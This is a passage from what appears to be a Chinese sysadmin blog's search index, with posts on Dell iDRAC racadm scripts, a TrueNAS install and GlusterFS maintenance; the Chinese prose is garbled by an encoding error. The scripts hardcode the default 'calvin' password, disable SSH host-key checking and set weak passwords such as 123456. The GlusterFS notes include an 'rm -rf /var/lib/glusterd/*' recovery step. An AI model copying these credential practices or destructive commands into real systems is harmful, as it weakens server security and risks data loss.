hardreset\r\n\r\nè®¾ç½®ç¡¬ç›˜ç¬¬ä¸€å¯åŠ¨ï¼Œç¦æ­¢F1/F2ç­‰å¾…\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.biosbootsettings.BootSeq HardDisk.List.1-1,NIC.Integrated.1-1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.16 racadm jobqueue create BIOS.Setup.1-1 \r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\r\n\r\nè®¾ç½®vnc\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.enable Enabled\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.Password calvin\r\n\r\nè®¾ç½®idracå…¶ä»–ç”¨æˆ·\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminUserName -i 4 newuser\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 123456\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPrivilege -i 4 0x000001ff\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminEnable -i 4 1\r\næ”¹æ‰å¯†ç \r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 987654\r\n\r\nNTPçš„è®¾ç½®\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.ipv4static.dns1 8.8.8.8\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 0.asia.pool.ntp.org\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 1.asia.pool.ntp.org\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 2.asia.pool.ntp.org\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 129.250.35.250\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 180.211.88.50\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 202.112.29.82\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPEnable Enabled\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPMaxDist 16\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.time.timezone Japan\r\n\r\nä¿®æ”¹ç½‘å¡å¯åŠ¨ä¸ºLegacy PXE\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set nic.nicconfig.1.legacybootproto PXE\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create NIC.Integrated.1-1-1\r\nipmitool -I lanplus -H $ip -U root -P calvin chassis power reset\n\u003c/code\u003e\u003c/pre\u003e","title":"dellæœåŠ¡å™¨idracå¸¸ç”¨æ“ä½œè„šæœ¬"},{"content":"æ— é”¡æµªæ½®TrueNASç³»ç»Ÿçš„å®‰è£…\nè¿™ä¸€ç‰ˆçš„æµªæ½®å®šåˆ¶NASæœºå™¨æ¯”è¾ƒç‰¹åˆ«ï¼Œæ²¡æœ‰ä»»ä½•Raidå¡ï¼Œé…äº†Avagoçš„ä¸€å—pcie sasç›´é€šå¡ï¼šæé€š9400å¡\nç„¶åæ˜¯å®šåˆ¶æœºï¼Œæ•´ä½“4Uçš„é«˜åº¦ï¼Œæ»¡é…æ˜¯60å—16Tçš„å¤§ç›˜ï¼Œä¸»æ¿åœ¨æœºç®±ä¾§é¢ç«‹ç€ï¼Œ2å—å°ç›˜åšç³»ç»Ÿã€‚\nç”±äºæœºæˆ¿é™åˆ¶ï¼Œæ— æ³•ç›´æ¥ä»æœ¬åœ°è®¿é—®10.18.30.97ï¼Œå¯¼è‡´æ— æ³•å°†æœ¬åœ°æ–‡ä»¶æŒ‚å…¥idracçš„cdromï¼Œåªèƒ½æ›²çº¿æ•‘å›½ï¼Œåœ¨172.18.31.2å»ºç«‹ä¸€ä¸ªnfs shareï¼ŒæŠŠå…‰ç›˜æ–‡ä»¶æ”¾è¿›å»\nåˆ° idrac çš„ Remote control ï¼Œ å†åˆ°Virtual mediaï¼Œé…å¥½nfså…±äº« ip: 172.18.31.2 path: /export/nfsshare\nåœ¨remote image redirctionä¸­å¯ä»¥çœ‹åˆ°å…‰ç›˜æ–‡ä»¶ï¼Œç‚¹å‡»Start\nç„¶åé‡å¯ï¼ŒCDROMæ˜¯ç¬¬ä¸€å¯åŠ¨åª’ä»‹\nå¼€å§‹å®‰è£…ï¼Œç¼ºçœä¼šè¿›å…¥ç¬¬ä¸€é¡¹è¿›è¡Œå®‰è£…\nç„¶åä¼šæŠ¥è¿™ä¸ªé”™ï¼Œpanic: AP #1 (PHY# 2) failed!\nè§äº†é¬¼äº†ï¼Œå”¯ä¸€çš„åœ°æ–¹å¯èƒ½æ˜¯ä¸»æ¿éƒ¨åˆ†å’Œåšé€šå¡å†²çªï¼Œæˆ‘ä»¬é‡å¯è¿›å…¥BIOSï¼Œåˆ°SATAå’ŒsSATAçš„åœ°æ–¹\næŠŠä¸»æ¿çš„SATAç»™å…³æ‰ï¼Œç¦æ­¢AHCI\nåŒæ ·å…³æ‰sSATAï¼Œä¹Ÿç¦æ­¢AHCI\nç„¶åé‡å¯å®‰è£…TrueNASï¼Œè¿™æ¬¡å°±å¯ä»¥é€šè¿‡äº† å®‰è£…ç›˜é€‰æ‹©å‰ä¸¤å—SSDå°ç›˜ï¼Œ230G openbsdä¼šè‡ªåŠ¨å°†è¿™ä¸¤æ¬¾å°ç›˜åšæˆè½¯Raid\næç¤ºä¼šæŠ¹æ‰ä¸¤å—ç›˜çš„æ‰€æœ‰æ•°æ®\nè¾“å…¥rootçš„å¯†ç \né€‰æ‹©Boot via BIOS\nå»ºç«‹16Gçš„swapç©ºé—´\nç„¶åå°±å¼€å§‹å®‰è£…ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆåŠ¨é™ï¼Œä¹Ÿæ²¡æœ‰è¿›åº¦æ¡ï¼Œä¼šç­‰å¾ˆä¹…\nå®‰è£…å®Œæˆåä¼šè®©ä½ é‡å¯ï¼Œç„¶åå‡ºæ¥é…ç½®ç•Œé¢\næˆ‘ä»¬é¦–å…ˆè¦é…ç½®ç¬¬äºŒé¡¹ï¼ŒBondingç«¯å£ ç„¶åå†é…ç¬¬ä¸€é¡¹çš„é™æ€IP å†é…ç¬¬å››é¡¹ç¼ºçœè·¯ç”± é…å®Œå°±httpå’Œhttpsæ˜¾ç¤ºæ­£ç¡®åœ°å€\nè¾“å…¥åœ°å€ï¼šhttp://172.18.30.97 ç™»å½•å°±å®Œæˆå®‰è£…äº†\n","permalink":"https://rendoumi.com/posts/20230330-truenas_install/","summary":"\u003cp\u003eæ— é”¡æµªæ½®TrueNASç³»ç»Ÿçš„å®‰è£…\u003c/p\u003e\n\u003cp\u003eè¿™ä¸€ç‰ˆçš„æµªæ½®å®šåˆ¶NASæœºå™¨æ¯”è¾ƒç‰¹åˆ«ï¼Œæ²¡æœ‰ä»»ä½•Raidå¡ï¼Œé…äº†Avagoçš„ä¸€å—pcie sasç›´é€šå¡ï¼šæé€š9400å¡\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_135251.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åæ˜¯å®šåˆ¶æœºï¼Œæ•´ä½“4Uçš„é«˜åº¦ï¼Œæ»¡é…æ˜¯60å—16Tçš„å¤§ç›˜ï¼Œä¸»æ¿åœ¨æœºç®±ä¾§é¢ç«‹ç€ï¼Œ2å—å°ç›˜åšç³»ç»Ÿã€‚\u003c/p\u003e\n\u003cp\u003eç”±äºæœºæˆ¿é™åˆ¶ï¼Œæ— æ³•ç›´æ¥ä»æœ¬åœ°è®¿é—®10.18.30.97ï¼Œå¯¼è‡´æ— æ³•å°†æœ¬åœ°æ–‡ä»¶æŒ‚å…¥idracçš„cdromï¼Œåªèƒ½æ›²çº¿æ•‘å›½ï¼Œåœ¨172.18.31.2å»ºç«‹ä¸€ä¸ªnfs shareï¼ŒæŠŠå…‰ç›˜æ–‡ä»¶æ”¾è¿›å»\u003c/p\u003e\n\u003cp\u003eåˆ° idrac çš„ Remote control ï¼Œ å†åˆ°Virtual mediaï¼Œé…å¥½nfså…±äº«\nip: 172.18.31.2\npath: /export/nfsshare\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_130429.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåœ¨remote image redirctionä¸­å¯ä»¥çœ‹åˆ°å…‰ç›˜æ–‡ä»¶ï¼Œç‚¹å‡»Start\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_130507.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åé‡å¯ï¼ŒCDROMæ˜¯ç¬¬ä¸€å¯åŠ¨åª’ä»‹\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_100332.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¼€å§‹å®‰è£…ï¼Œç¼ºçœä¼šè¿›å…¥ç¬¬ä¸€é¡¹è¿›è¡Œå®‰è£…\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_100437.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åä¼šæŠ¥è¿™ä¸ªé”™ï¼Œpanic: AP #1 (PHY# 2) failed!\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_095148.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè§äº†é¬¼äº†ï¼Œå”¯ä¸€çš„åœ°æ–¹å¯èƒ½æ˜¯ä¸»æ¿éƒ¨åˆ†å’Œåšé€šå¡å†²çªï¼Œæˆ‘ä»¬é‡å¯è¿›å…¥BIOSï¼Œåˆ°SATAå’ŒsSATAçš„åœ°æ–¹\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134550.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŠŠä¸»æ¿çš„SATAç»™å…³æ‰ï¼Œç¦æ­¢AHCI\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134704.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134624.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåŒæ ·å…³æ‰sSATAï¼Œä¹Ÿç¦æ­¢AHCI\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134744.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134808.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åé‡å¯å®‰è£…TrueNASï¼Œè¿™æ¬¡å°±å¯ä»¥é€šè¿‡äº†\nå®‰è£…ç›˜é€‰æ‹©å‰ä¸¤å—SSDå°ç›˜ï¼Œ230G\nopenbsdä¼šè‡ªåŠ¨å°†è¿™ä¸¤æ¬¾å°ç›˜åšæˆè½¯Raid\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_115448.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæç¤ºä¼šæŠ¹æ‰ä¸¤å—ç›˜çš„æ‰€æœ‰æ•°æ®\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_115557.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¾“å…¥rootçš„å¯†ç \u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_115642.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé€‰æ‹©Boot via BIOS\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_120946.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå»ºç«‹16Gçš„swapç©ºé—´\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_121016.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå°±å¼€å§‹å®‰è£…ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆåŠ¨é™ï¼Œä¹Ÿæ²¡æœ‰è¿›åº¦æ¡ï¼Œä¼šç­‰å¾ˆä¹…\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_121051.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå®‰è£…å®Œæˆåä¼šè®©ä½ é‡å¯ï¼Œç„¶åå‡ºæ¥é…ç½®ç•Œé¢\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_131715.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é¦–å…ˆè¦é…ç½®ç¬¬äºŒé¡¹ï¼ŒBondingç«¯å£\nç„¶åå†é…ç¬¬ä¸€é¡¹çš„é™æ€IP\nå†é…ç¬¬å››é¡¹ç¼ºçœè·¯ç”±\né…å®Œå°±httpå’Œhttpsæ˜¾ç¤ºæ­£ç¡®åœ°å€\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_132440.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¾“å…¥åœ°å€ï¼šhttp://172.18.30.97\nç™»å½•å°±å®Œæˆå®‰è£…äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_140955.png\"\u003e\u003c/p\u003e","title":"TureNASç³»ç»Ÿåœ¨æµªæ½®å®šåˆ¶ç³»ç»Ÿä¸Šçš„å®‰è£…"},{"content":"ç‰¹åˆ«æ³¨æ„ ä¸¤å°GFSä¸»æœº172.18.30.18å’Œ172.18.30.36ä¸Šé¢åŠ¡å¿…é…ç½®/etc/hostsï¼Œå¦åˆ™peerçš„æ—¶å€™ä¼šæœ‰é—®é¢˜\n172.18.30.18 renhe-18-30-18\r172.18.30.18 renhe-18-30-36\rå®¢æˆ·ç«¯å®‰è£… yum -y install epel-release ç„¶å yum install glusterfs-fuse å°±å¯ä»¥äº† æŒ‚è½½ï¼š mount.glusterfs 172.18.30.18:/borui-vol /data/br/nfs\nfstab è‡ªåŠ¨æŒ‚è½½ 172.18.30.18:/borui-vol /data/br/nfs glusterfs defaults,_netdev,backupvolfile-server=172.18.30.36 0 0\nåœ¨172.18.30.18ä¸Šå»ºç«‹æ–°å·ï¼Œå› ä¸ºåªæœ‰2ä¸ªèŠ‚ç‚¹ï¼Œå°±å¿…é¡»forceäº† gluster volume create test-zhichi-vol replica 2 transport tcp 172.18.30.18:/glusterfs/test-zhichi-vol 172.18.30.36:/glusterfs/test-zhichi-vol force å¯åŠ¨ gluster volume start test-zhichi-vol\næŸ¥çœ‹ä¸€ä¸‹ gluster volume info test-zhichi-vol\næŸ¥çœ‹å·ä¿¡æ¯(ç¦æ­¢æŸ¥çœ‹inodeï¼Œå¤ªå¤šäº†) gluster volume status test-zhichi-vol detail gluster volume status test-zhichi-vol clients gluster volume status test-zhichi-vol mem gluster volume status test-zhichi-vol fd gluster volume status test-zhichi-vol inode å¼€å¯é™é¢ gluster volume quota test-zhichi-vol enable gluster volume quota test-zhichi-vol limit-usage / 50GB gluster volume quota test-zhichi-vol list é™åˆ¶IPè®¿é—® ä¾‹å¦‚å…è®¸172.18.31.*ç½‘æ®µçš„ä¸»æœºè®¿é—®rep-volumeï¼š\ngluster volume set test-zhichi-vol auth.allow 172.18.31.*`\nå¦‚æœå®¢æˆ·ç«¯æƒ³ç”¨NFSæŒ‚è½½ gluster volume set test-zhichi-vol nfs.disable off\nå¼€å¯æ€§èƒ½åˆ†æï¼ˆæ…ç”¨ï¼‰ gluster volume profile test-zhichi-vol start\nå¼€å¯åæ€§èƒ½åˆ†æåï¼Œæ˜¾ç¤ºI/Oä¿¡æ¯: gluster volume profile gv0 info\nGlusterd å¯åŠ¨å¤±è´¥ï¼ŒåŸå› æœªçŸ¥å¤„ç†åŠæ³•ï¼ˆæ…ç”¨ï¼Œæ‹·å‡ºæ•°æ®åå†ç”¨ï¼‰ï¼š rm -rf /var/lib/glusterd/* systemctl start glusterd è„‘è£‚è§£å†³æ–¹æ³•ï¼š è„‘è£‚ï¼š ä½¿ç”¨replicaæ¨¡å¼çš„æ—¶å€™ï¼Œå¦‚æœå‘ç”Ÿç½‘ç»œæ•…éšœï¼ˆæ¯”å¦‚äº¤æ¢æœºåäº†ã€ç½‘çº¿è¢«ç¢°æ‰äº†ï¼‰ï¼Œè€Œä¸¤å°æœºå™¨éƒ½è¿˜æ´»ç€çš„æ—¶å€™ï¼Œå®ƒä»¬å„è‡ªçš„æ•°æ®è¯»å†™è¿˜ä¼šç»§ç»­ã€‚\nå½“ç½‘ç»œæ¢å¤æ—¶ï¼Œå®ƒä»¬éƒ½ä¼šè®¤ä¸ºè‡ªå·±çš„æ•°æ®æ‰æ˜¯æ­£ç¡®çš„ï¼Œå¯¹æ–¹çš„æ˜¯é”™è¯¯çš„ï¼Œè¿™å°±æ˜¯ä¿—ç§°çš„è„‘è£‚ã€‚\nåŒæ–¹è°éƒ½ä¸è‚¯å¦¥åï¼Œç»“æœå°±æ˜¯æ–‡ä»¶æ•°æ®è¯»å–é”™è¯¯ï¼Œç³»ç»Ÿæ— æ³•æ­£å¸¸è¿è¡Œã€‚ åœ¨æ­£å¸¸çš„æœºå™¨ä¸Šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\ngluster volume status nfsp ï¼ˆçœ‹çœ‹è¿™ä¸ªèŠ‚ç‚¹æœ‰æ²¡æœ‰åœ¨çº¿ï¼‰ gluster volume heal nfsp full ï¼ˆå¯åŠ¨å®Œå…¨ä¿®å¤ï¼‰ gluster volume heal nfsp info ï¼ˆæŸ¥çœ‹éœ€è¦ä¿®å¤çš„æ–‡ä»¶ï¼‰ gluster volume heal nfsp info healed ï¼ˆæŸ¥çœ‹ä¿®å¤æˆåŠŸçš„æ–‡ä»¶ï¼‰ gluster volume heal nfsp info heal-failed ï¼ˆæŸ¥çœ‹ä¿®å¤å¤±è´¥çš„æ–‡ä»¶ï¼‰ gluster volume heal nfsp info split-brain ï¼ˆæŸ¥çœ‹è„‘è£‚çš„æ–‡ä»¶ï¼‰ Gathering Heal info on volume nfsp has been successful Brick gls03.mycloud.com.cn:/glusterfs/nfsp Number of entries: 24 at path on brick ----------------------------------- 2014-05-30 10:22:20 /36c741b8-2de2-46e9-9e3c-8c7475e4dd10 ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ åœ¨æœ‰ç—…çš„é‚£å°æœºå™¨ä¸Šï¼Œåˆ é™¤è„‘è£‚çš„æ–‡ä»¶ï¼š ï¼ˆæ³¨æ„ï¼è¦åˆ é™¤çš„æ–‡ä»¶æ˜¯åœ¨gluster volume info nfspçœ‹åˆ°çš„ç›®å½•ä¸­ï¼Œä¸è¦å»åˆ é™¤æŒ‚è½½çš„ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä¸ç„¶å°±ç­‰ç€å“­å§ï¼‰ æŠŠç¡¬é“¾æ¥æ–‡ä»¶æ‰¾å‡ºæ¥ï¼Œä¹Ÿè¦åˆ é™¤ï¼š\nfind /glusterfs/nfsp/ -samefile /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 -print /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 /glusterfs/nfsp/.glusterfs/65/26/6526e766-cb26-434c-9605-eacb21316447 ï¼ˆè¿™é‡Œçœ‹å¾—å‡ºç¡¬é“¾æ¥æ–‡ä»¶çš„ç›®å½•åå’Œæ—¥å¿—ä¸­çš„gfidçš„å¯¹åº”å…³ç³»ï¼‰\nåˆ é™¤æ‰ï¼š\nrm /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 rm /glusterfs/nfsp/.glusterfs/65/26/6526e766-cb26-434c-9605-eacb21316447 åœ¨æ­£å¸¸çš„æœºå™¨ä¸Šæ‰§è¡Œ\ntail -1 /nfsprimary/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 ï¼ˆè¯»ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œè§¦å‘ä¿®å¤ï¼‰ ls -l /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 äººå·¥æŸ¥çœ‹ä¸€ä¸‹ä¸¤å°æœºå™¨çš„æ•°æ®æ˜¯å¦ä¸€è‡´\nå…¶å®ƒçš„è„‘è£‚æ–‡ä»¶ä¹Ÿæ˜¯ä¸€æ ·å¤„ç†ã€‚ æ²¡é—®é¢˜çš„è¯ï¼Œé‡æ–°æŒ‚è½½ç›®å½•:\numount /nfsprimary /bin/mount -t glusterfs 10.10.10.21:/nfsp /nfsprimary/ ","permalink":"https://rendoumi.com/posts/20230330-glusterfs/","summary":"\u003ch2 id=\"ç‰¹åˆ«æ³¨æ„\"\u003eç‰¹åˆ«æ³¨æ„\u003c/h2\u003e\n\u003cp\u003eä¸¤å°GFSä¸»æœº172.18.30.18å’Œ172.18.30.36ä¸Šé¢åŠ¡å¿…é…ç½®/etc/hostsï¼Œå¦åˆ™peerçš„æ—¶å€™ä¼šæœ‰é—®é¢˜\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e172.18.30.18 renhe-18-30-18\r\n172.18.30.18 renhe-18-30-36\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch4 id=\"å®¢æˆ·ç«¯å®‰è£…\"\u003eå®¢æˆ·ç«¯å®‰è£…\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç„¶å yum  install glusterfs-fuse å°±å¯ä»¥äº†\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"æŒ‚è½½\"\u003eæŒ‚è½½ï¼š\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003emount.glusterfs 172.18.30.18:/borui-vol /data/br/nfs\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"fstab-è‡ªåŠ¨æŒ‚è½½\"\u003efstab è‡ªåŠ¨æŒ‚è½½\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e172.18.30.18:/borui-vol /data/br/nfs glusterfs defaults,_netdev,backupvolfile-server=172.18.30.36 0 0\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"åœ¨172183018ä¸Šå»ºç«‹æ–°å·å› ä¸ºåªæœ‰2ä¸ªèŠ‚ç‚¹å°±å¿…é¡»forceäº†\"\u003eåœ¨172.18.30.18ä¸Šå»ºç«‹æ–°å·ï¼Œå› ä¸ºåªæœ‰2ä¸ªèŠ‚ç‚¹ï¼Œå°±å¿…é¡»forceäº†\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume create test-zhichi-vol replica \u003cspan class=\"m\"\u003e2\u003c/span\u003e transport tcp 172.18.30.18:/glusterfs/test-zhichi-vol 172.18.30.36:/glusterfs/test-zhichi-vol force\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"å¯åŠ¨\"\u003eå¯åŠ¨\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003egluster volume start test-zhichi-vol\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"æŸ¥çœ‹ä¸€ä¸‹\"\u003eæŸ¥çœ‹ä¸€ä¸‹\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003egluster volume info test-zhichi-vol\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"æŸ¥çœ‹å·ä¿¡æ¯ç¦æ­¢æŸ¥çœ‹inodeå¤ªå¤šäº†\"\u003eæŸ¥çœ‹å·ä¿¡æ¯(ç¦æ­¢æŸ¥çœ‹inodeï¼Œå¤ªå¤šäº†)\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol detail\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol clients\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol mem\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol fd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol inode\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"å¼€å¯é™é¢\"\u003eå¼€å¯é™é¢\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota 